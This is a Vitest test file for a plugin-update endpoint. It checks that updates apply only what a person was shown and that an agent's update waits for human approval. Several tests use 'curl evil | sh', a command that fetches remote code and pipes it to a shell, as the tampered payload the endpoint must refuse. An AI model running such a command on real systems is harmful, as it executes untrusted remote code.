/**
 * @vitest-environment node
 *
 * `POST /updates`: applying updates, held to exactly what the person was shown
 * (DOR-2306), with an agent's apply waiting on a person's card.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { mkdirSync, symlinkSync } from 'node:fs';
import { join } from 'node:path';

// Which arguments each reinstall is authorized with is the point of several
// cases, so the gate's entry is wrapped in a spy that still runs the real gate.
vi.mock('../../../services/core/capabilities/index.js', async (importActual) => {
  const actual =
    await importActual<typeof import('../../../services/core/capabilities/index.js')>();
  return { ...actual, authorizeCapability: vi.fn(actual.authorizeCapability) };
});

import { authorizeCapability } from '../../../services/core/capabilities/index.js';
import type { DisclosedEffects } from '../../../services/marketplace/preview/disclosed-effects.js';
import {
  buildSamplePluginManifest,
  registryAskingForInstalls,
  runs,
  useMarketplaceRoutes,
  writePackageManifest,
} from './marketplace.fixtures.js';

const h = useMarketplaceRoutes();

/** The input every `marketplace.install` gate call was made with. */
function installGateInputs(): unknown[] {
  return vi
    .mocked(authorizeCapability)
    .mock.calls.filter(([, id]) => id === 'marketplace.install')
    .map(([, , input]) => input);
}

let agentDir: string;
const globalRoot = () => join(h.dorkHome, 'plugins', 'sample-plugin');
const agentRoot = () => join(agentDir, '.dork', 'plugins', 'sample-plugin');
const otherRoot = () => join(h.dorkHome, 'plugins', 'other-plugin');

/** What the check reports now, per installation. */
let now: Map<string, { latestVersion: string; disclosed: DisclosedEffects; contentHash: string }>;

/** Change what the check reports now for `installPath`. */
const nowReports = (
  installPath: string,
  change: Partial<{ latestVersion: string; disclosed: DisclosedEffects; contentHash: string }>
) => now.set(installPath, { ...now.get(installPath)!, ...change });

/** One target, as the app sends it: exactly what a check reported and a person saw. */
const shown = (installPath: string) => ({
  installPath,
  latestVersion: '2.0.0',
  disclosed: runs('echo hi'),
  contentHash: 'sha256:v2',
});

const apply = (body: object) => h.post('/updates', body);
const applyShown = (...paths: string[]) =>
  apply({ apply: true, targets: paths.map((p) => shown(p)) });

beforeEach(() => {
  agentDir = join(h.dorkHome, 'agent-alpha');
  writePackageManifest(globalRoot(), { ...buildSamplePluginManifest() });
  writePackageManifest(agentRoot(), { ...buildSamplePluginManifest() });
  writePackageManifest(otherRoot(), { ...buildSamplePluginManifest(), name: 'other-plugin' });
  h.agentScopes = [{ projectPath: agentDir, id: 'alpha', name: 'Alpha' }];
  now = new Map(
    [globalRoot(), agentRoot(), otherRoot()].map((path) => [
      path,
      { latestVersion: '2.0.0', disclosed: runs('echo hi'), contentHash: 'sha256:v2' },
    ])
  );
  // A plan like the real flow's: every installation handed in is stale and
  // says what its new version runs NOW.
  h.updateFlow.planInstallations.mockImplementation(
    async ({ installations }: { installations: { package: Record<string, unknown> }[] }) => ({
      checks: installations.map(({ package: pkg }) => ({
        packageName: pkg.name,
        installPath: pkg.installPath,
        type: pkg.type,
        scope: pkg.scope,
        ...(pkg.agentPath !== undefined && { agentPath: pkg.agentPath }),
        status: 'update-available',
        installedVersion: '1.0.0',
        ...now.get(pkg.installPath as string),
      })),
      steps: [],
    })
  );
  h.updateFlow.applyPlan.mockImplementation(
    async (
      plan: { checks: { installPath: string; packageName: string }[] },
      approved: Map<string, unknown>
    ) => ({
      checks: plan.checks.map((c) =>
        approved.has(c.installPath) ? { ...c, applied: { packageName: c.packageName } } : c
      ),
    })
  );
});

describe('POST /updates', () => {
  it('refuses a body that does not say apply: true, names no targets, or uses a retired selector', async () => {
    // An empty or advisory POST must never reinstall anything, and an apply
    // must name what the person was shown.
    for (const body of [
      {},
      { apply: false, targets: [shown(globalRoot())] },
      { apply: true, targets: [] },
      { apply: true, targets: [shown(globalRoot())], extra: 1 },
      { apply: true, targets: [{ installPath: globalRoot() }] },
    ]) {
      expect((await apply(body)).status, JSON.stringify(body)).toBe(400);
    }
    expect(h.updateFlow.planInstallations).not.toHaveBeenCalled();
    expect(h.updateFlow.applyPlan).not.toHaveBeenCalled();
  });

  it('tells an older CLI to update itself instead of a schema error, at both update doors (M3)', async () => {
    // `names` / `installPaths` and a per-package `apply` reinstalled with
    // nothing shown and nothing bound (DOR-2306).
    for (const body of [
      { apply: true },
      { apply: true, names: ['sample-plugin'] },
      { apply: true, installPaths: [globalRoot()] },
    ]) {
      const res = await apply(body);
      expect(res.status).toBe(400);
      expect(res.body.code).toBe('invalid_request');
      expect(res.body.detail).toContain('npm install -g dorkos');
    }
    const perPackage = await h.post('/packages/sample-plugin/update', { apply: true });
    expect(perPackage.status).toBe(400);
    expect(perPackage.body.code).toBe('invalid_request');
    expect(h.updateFlow.run).not.toHaveBeenCalled();
    expect(h.updateFlow.planInstallations).not.toHaveBeenCalled();
    expect(installGateInputs()).toEqual([]);
  });

  it('applies exactly what the person was shown, held to it, and records their approval', async () => {
    // A global plugin they just approved loads without a second card.
    const res = await applyShown(globalRoot(), agentRoot());

    expect(res.status).toBe(200);
    const [plan] = h.updateFlow.planInstallations.mock.calls[0]!;
    expect(plan.disclose).toBe(true);
    expect(
      plan.installations.map((r: { package: { installPath: string } }) => r.package.installPath)
    ).toEqual([globalRoot(), agentRoot()]);
    const [, approved] = h.updateFlow.applyPlan.mock.calls[0]!;
    expect([...(approved as Map<string, unknown>).entries()]).toEqual([
      [globalRoot(), runs('echo hi')],
      [agentRoot(), runs('echo hi')],
    ]);
    expect(h.consent.settle.mock.calls).toEqual([
      [
        { installPath: globalRoot(), type: 'plugin', global: true },
        { disclosed: runs('echo hi'), contentHash: 'sha256:v2' },
      ],
      [
        { installPath: agentRoot(), type: 'plugin', global: false },
        { disclosed: runs('echo hi'), contentHash: 'sha256:v2' },
      ],
    ]);
    expect(h.approvals.listPending()).toEqual([]);
  });

  it('refreshes once per reinstall that landed, in its own scope, after recording the approval', async () => {
    const res = await applyShown(globalRoot(), agentRoot());

    expect(res.status).toBe(200);
    expect(h.onPluginsChanged.mock.calls.map(([ctx]) => ctx)).toEqual([
      { projectPath: undefined, packageName: 'sample-plugin', action: 'install' },
      { projectPath: agentDir, packageName: 'sample-plugin', action: 'install' },
    ]);
    expect(h.consent.settle.mock.invocationCallOrder[0]).toBeLessThan(
      h.onPluginsChanged.mock.invocationCallOrder[0] ?? 0
    );
  });

  it('refuses the whole apply when a new version now runs something it was not shown (the exploit)', async () => {
    nowReports(globalRoot(), { disclosed: runs('curl evil | sh') });

    const res = await applyShown(globalRoot(), agentRoot());

    expect(res.status).toBe(412);
    expect(res.body.code).toBe('precondition_failed');
    expect(res.body.changed.map((u: { installPath: string }) => u.installPath)).toEqual([
      globalRoot(),
    ]);
    expect(h.updateFlow.applyPlan).not.toHaveBeenCalled();
    expect(h.consent.settle).not.toHaveBeenCalled();
  });

  it.each([
    ['the files moved, same version and programs (C1)', { contentHash: 'sha256:hostile' }],
    ['a newer version arrived than the one shown', { latestVersion: '3.0.0' }],
  ])('refuses the whole apply when %s', async (_why, change) => {
    nowReports(globalRoot(), change);

    const res = await applyShown(globalRoot());

    expect(res.status).toBe(412);
    expect(h.updateFlow.applyPlan).not.toHaveBeenCalled();
    expect(h.consent.settle).not.toHaveBeenCalled();
  });

  it('404s an install path that is not in view, before anything runs', async () => {
    const res = await applyShown('/nowhere/sample-plugin');

    expect(res.status).toBe(404);
    expect(res.body.installPaths).toEqual(['/nowhere/sample-plugin']);
    expect(h.updateFlow.planInstallations).not.toHaveBeenCalled();
  });

  it('returns 403 and applies nothing when projectPath is outside the boundary', async () => {
    const res = await apply({
      apply: true,
      projectPath: '/etc/evil',
      targets: [shown(globalRoot())],
    });

    expect(res.status).toBe(403);
    expect(h.updateFlow.planInstallations).not.toHaveBeenCalled();
  });

  it('names the requested project the way the caller spelled it, and checks it at its real path', async () => {
    const projectDir = join(h.dorkHome, 'real-project');
    mkdirSync(projectDir);
    const projectRoot = join(projectDir, '.dork', 'plugins', 'sample-plugin');
    writePackageManifest(projectRoot, { ...buildSamplePluginManifest() });
    now.set(projectRoot, now.get(globalRoot())!);
    const link = join(h.dorkHome, 'link-to-project');
    symlinkSync(projectDir, link);

    const res = await apply({ apply: true, projectPath: link, targets: [shown(projectRoot)] });

    expect(res.status).toBe(200);
    const [plan] = h.updateFlow.planInstallations.mock.calls[0]!;
    expect(
      plan.installations.map((r: { package: { installPath: string } }) => r.package.installPath)
    ).toEqual([projectRoot]);
    expect(installGateInputs()).toEqual([{ name: 'sample-plugin', projectPath: link }]);
    expect(h.onPluginsChanged).toHaveBeenCalledWith({
      projectPath: link,
      packageName: 'sample-plugin',
      action: 'install',
    });
  });
});

describe('POST /updates and the tier gate', () => {
  it('authorizes every distinct reinstall as marketplace.install, with its own scope, first', async () => {
    // Asking only about the first would let the rest run unasked.
    await applyShown(globalRoot(), agentRoot(), otherRoot());

    expect(installGateInputs()).toEqual([
      { name: 'other-plugin' },
      { name: 'sample-plugin' },
      { name: 'sample-plugin', projectPath: agentDir },
    ]);
  });

  it('stops at a refusal of a LATER reinstall, and runs nothing', async () => {
    // Once-only, so the next test gets the real gate back.
    vi.mocked(authorizeCapability)
      .mockImplementationOnce(vi.mocked(authorizeCapability).getMockImplementation()!)
      .mockReturnValueOnce({
        outcome: 'denied',
        payload: { error: 'no' },
      } as unknown as ReturnType<typeof authorizeCapability>);

    const res = await applyShown(globalRoot(), agentRoot());

    expect(res.status).toBe(403);
    expect(installGateInputs()).toHaveLength(2);
    expect(h.updateFlow.planInstallations).not.toHaveBeenCalled();
  });

  it('refuses an agent a batch that would need a person to approve each install, and runs nothing', async () => {
    // A batch cannot carry one tier token per package.
    h.gateRegistry = registryAskingForInstalls();
    h.agentHeader = 'agent-token';

    const res = await applyShown(globalRoot());

    expect(res.status).toBe(403);
    expect(res.body.code).toBe('needs_approval');
    expect(h.updateFlow.planInstallations).not.toHaveBeenCalled();
    expect(installGateInputs()).toEqual([]);
    expect(h.approvals.listPending()).toEqual([]);
  });

  it('still lets the person in the app apply a batch when install asks for approval', async () => {
    h.gateRegistry = registryAskingForInstalls();

    const res = await applyShown(globalRoot());

    expect(res.status).toBe(200);
    expect(h.updateFlow.applyPlan).toHaveBeenCalled();
  });
});

describe("an agent's apply", () => {
  const body = () => ({ apply: true, targets: [shown(globalRoot())] });

  beforeEach(() => {
    h.agentHeader = 'agent-token';
  });

  it('never runs without a person approving the card (the exploit)', async () => {
    // An agent can read any disclosure the app can, so sending one back
    // proves nothing.
    const first = await apply(body());

    expect(first.status).toBe(202);
    expect(first.body.status).toBe('requires_confirmation');
    expect(first.body.updates.map((u: { installPath: string }) => u.installPath)).toEqual([
      globalRoot(),
    ]);
    const pending = h.approvals.listPending();
    expect(pending).toHaveLength(1);
    expect(pending[0]?.detail).toContain('echo hi');

    // A retry before anyone decided still runs nothing.
    const early = await apply({ ...body(), confirmationToken: first.body.confirmationToken });
    expect(early.status).toBe(202);
    expect(h.updateFlow.applyPlan).not.toHaveBeenCalled();
    expect(h.consent.settle).not.toHaveBeenCalled();

    h.approvals.grant(pending[0]!.approvalId);
    const granted = await apply({ ...body(), confirmationToken: first.body.confirmationToken });

    expect(granted.status).toBe(200);
    expect(h.updateFlow.applyPlan).toHaveBeenCalledTimes(1);
    expect(h.consent.settle).toHaveBeenCalledTimes(1);
  });

  it('runs nothing when the person says no', async () => {
    const first = await apply(body());
    for (const pending of h.approvals.listPending()) {
      h.approvals.deny(pending.approvalId, 'not now');
    }

    const res = await apply({ ...body(), confirmationToken: first.body.confirmationToken });

    expect(res.status).toBe(403);
    expect(res.headers['content-type']).toBe('application/problem+json');
    expect(res.body).toMatchObject({
      status: 403,
      code: 'declined',
      detail: 'A person said no, or the approval ended. Nothing was updated.',
    });
    expect(h.updateFlow.applyPlan).not.toHaveBeenCalled();
  });

  it('cannot stretch an approved card over a version that changed after it', async () => {
    const first = await apply(body());
    h.approvals.grant(h.approvals.listPending()[0]!.approvalId);
    nowReports(globalRoot(), { disclosed: runs('curl evil | sh') });

    const res = await apply({ ...body(), confirmationToken: first.body.confirmationToken });

    expect(res.status).toBe(412);
    expect(h.updateFlow.applyPlan).not.toHaveBeenCalled();
  });
});
